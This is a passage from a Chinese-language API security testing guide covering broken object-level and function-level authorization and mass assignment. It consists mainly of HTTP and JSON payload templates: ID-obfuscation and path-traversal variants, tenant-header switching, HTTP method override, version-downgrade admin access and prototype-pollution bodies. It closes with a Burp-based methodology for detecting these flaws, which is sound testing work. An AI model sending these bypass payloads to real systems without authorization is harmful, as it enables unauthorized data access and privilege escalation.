## 四、授权测试（BOLA/BFLA/BOPLA，高级）

### 4.1 BOLA（对象级授权/IDOR）高级变体
```http
# 基础：A的Token访问B的资源
GET /api/users/2/profile       Authorization: Bearer <userA_token>

# ID变形（规避简单正则/权限key）：
GET /api/users/02              # 前导零
GET /api/users/2.json          # 扩展名
GET /api/users/2%00            # 空字节
GET /api/users/2;x=y           # 矩阵参数
GET /api/users/2/../../admin   # 路径穿越
GET /api/users?id=2            # 参数位置切换
POST /api/query {"user_id":2}  # body迁移

# 多租户BOLA：
GET /api/tenant/1/data         # 切租户
X-Tenant-ID: 1 → 2             # 租户头
X-Org-ID / X-Account-ID / X-Workspace-ID  # 常见租户头
# 子域租户：a.target.com → b.target.com 切换

# 关系链BOLA（关键高级手法）：
# 通过对象间关系间接访问：order→user→profile
GET /api/orders/1001/owner/profile        # 从他人订单链到资料
GET /api/invoices/500/users/2/email       # 发票→用户
GET /api/teams/1/members/2/documents/3    # 多级嵌套
# 批量/搜索接口：
GET /api/search?q=&limit=10000
GET /api/export?type=all&user_id=*
# 数组批量绕过单对象检查：
POST /api/action {"id":[1,2,3]}
```

### 4.2 BFLA（功能级授权/垂直越权）
```http
# 管理员接口直连
GET  /api/admin/users
POST /api/admin/users/create
DELETE /api/users/1

# 方法混淆
POST /api/users/1 HTTP/1.1
X-HTTP-Method-Override: DELETE
_method=DELETE
PUT 代替 PATCH（覆盖不同权限分支）

# 版本降级绕过（老版本无鉴权）
GET /api/v1/admin/dashboard     # v1无权限检查
GET /api/beta/admin/dashboard
GET /api/legacy/admin/users

# 网关vs后端差异
# 网关校验了方法，后端服务未校验 → 直连后端端口
# 或：网关放行GET，后端把GET当POST处理（框架差异）
```

### 4.3 批量分配（Mass Assignment/BOPLA）高级
```json
POST /api/users
{"name":"test","is_admin":true,"role":"admin","balance":999999}

// JSON深度合并/原型污染辅助：
{"name":"x","__proto__":{"isAdmin":true}}      // 原型污染变体（Node.js）
{"name":"x","constructor":{"prototype":{"isAdmin":true}}}
{"user":{"name":"x","role":"admin"}}           // 嵌套对象绑定
{"name":"x","role":["user","admin"]}           // 数组绕过白名单

// 方法差异：
PATCH /api/user/profile {"theme":"dark"}       // PATCH部分更新=批量分配高发
// 字段枚举：通过错误提示/文档/历史版本获取隐藏字段名
```

### 4.4 自动化BOLA检测方法论（实战落地）
```
# 核心：多账户会话对比 + 响应差异分析
# 1. 准备高/低权限两个账户（或userA/userB）
# 2. 用高权限账户走一遍全API → 记录所有请求（Burp Session Handling）
# 3. Autorize/自定义插件用低权限Cookie重放，标记"200且body不同"
# 4. 关键：不仅看状态码，对比响应body（401≠403≠404语义）
# 5. 用 AutoRepeater 自动替换资源ID参数重放
# 6. 对每个端点评估：状态码→响应长度→内容差异→业务语义

工具组合：
- Burp: Autorize（低权Cookie重放）+ AuthMatrix（角色矩阵）+ AutoRepeater（ID替换）
- 开源：Uzys BOLA Scanner、BBOT API模式、Custom GPT辅助diff
- 脚本化：Python批量替换ID + 响应hash对比（见idor-testing技能9.x）

# 高级：被动检测
# 用高权账号浏览，低权账号被动监听同域响应，智能体对比
# 对批量接口重点检测：分页、导出、搜索接口的"全量数据"特征
```

